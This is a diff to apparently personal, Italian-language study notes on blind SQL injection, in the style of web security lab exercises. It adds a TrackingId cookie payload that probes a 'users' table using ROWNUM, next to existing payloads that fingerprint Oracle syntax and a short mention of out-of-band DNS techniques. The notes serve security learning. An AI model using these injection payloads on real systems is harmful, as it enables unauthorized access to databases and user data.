@@ -98,6 +98,8 @@ da provare per verificare il sistema
 TrackingId=xyz'||(SELECT '' FROM dual)||'  -> oracle syntax
 TrackingId=xyz'||(SELECT '')||'   -> sql syntax
 
+TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'       -> importante tenere in considerazione WHERE ROWNUM in modo tale da non restituire più colonne e non rompere la concatenazione
+
 OAST techniques
 genera DNS query spesso
 con collaborator si monta un dns server e ricevere le risposte
